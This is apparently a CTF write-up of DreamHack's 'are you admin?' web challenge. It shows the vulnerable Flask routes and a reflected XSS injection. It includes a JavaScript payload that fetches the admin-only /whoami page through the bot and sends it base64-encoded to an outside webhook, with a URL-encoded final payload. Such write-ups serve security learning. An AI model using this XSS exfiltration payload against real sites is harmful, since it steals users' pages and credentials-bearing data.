# are you admin? — DreamHack

> **Room / Challenge:** are you admin? (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** are you admin? (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1922`
- **Level:** `2`
- **Date:** `19-11-2025`

---

## Goal

XSS Scripting takes in place to get the flag.

## My Solution

The app is vulnerable to XSS Scripting:

```python
@app.route("/intro", methods=["GET"])
def intro():
    name = request.args.get("name")
    detail = request.args.get("detail")
    return render_template("intro.html", name=name, detail=detail)


@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        path = request.form.get("path")
        if not path:
            return render_template("report.html", msg="fail")

        else:
            parsed_path = urlparse(path)
            params = parse_qs(parsed_path.query)
            name = params.get("name", [None])[0]
            detail = params.get("detail", [None])[0]

            if access_page(name, detail):
                return render_template("report.html", message="Success")
            else:
                return render_template("report.html", message="fail")
    else:
        return render_template("report.html")



@app.route("/whoami", methods=["GET"])
def whoami():
    user_info = ""
    authorization = request.headers.get('Authorization')

    if authorization:
        user_info = b64decode(authorization.split('Basic ')[1].encode()).decode()
    else:
        user_info = "guest:guest"

    id = user_info.split(":")[0]
    password = user_info.split(":")[1]
    if ((id == 'admin') and (password == '[**REDACTED**]')):
        message = FLAG
        return render_template('whoami.html',id=id, message=message)
    else:
        message = "You are guest"
        return render_template('whoami.html',id=id, message=message)
```

There are 3 routes in the app, `/intro` is where we use to inject Javascript, `/report` is to report the URL to the bot, `/whoami` is where we can use to make the bot to get the flag for us.

Because `/intro` doesn't have any filter or CSP Bypas that prevents XSS Scripting, therefore we can tried `/intro?name=<script>alert(1)</script>&detail=XSS` to inject Javascript:
![Guide image](./screenshots/1.png)
Now based on the app structure let's create our exploit Javascript:

```javascript
fetch("/whoami")
  .then((response) => response.text())
  .then((flag) => {
    location.href = "https://YOUR_SERVER/webhook?c=" + btoa(flag);
  });
```

By this after the bot fetch the `/whoami` route content, and since the bot has the admin role:

```python
user_info = f'admin:{PASSWORD}'
encoded_user_info = b64encode(user_info.encode()).decode()
driver.execute_cdp_cmd(
    'Network.setExtraHTTPHeaders',
    {'headers': {'Authorization': f'Basic {encoded_user_info}'}}
)
```

The `/whoami` route will return the flag for us. Let's url-encoded it to prevent any errors. Final payload to report:

```
/intro?name=%3Cscript%3Efetch%28%22%2Fwhoami%22%29.then%28%28t%3D%3Et.text%28%29%29%29.then%28%28t%3D%3E%7Blocation.href%3D%22https%3A%2F%2Fapi-sgn.jameskaois.com%2Fwebhook%3Fc%3D%22%2Bbtoa%28t%29%7D%29%29%3B%3C%2Fscript%3E&detail=exploit
```

![Guide image](./screenshots/2.png)
The result is a really long base64 encode text because it is a whole HTML page, the flag is in the end take that and base64 decode:
![Guide image](./screenshots/3.png)
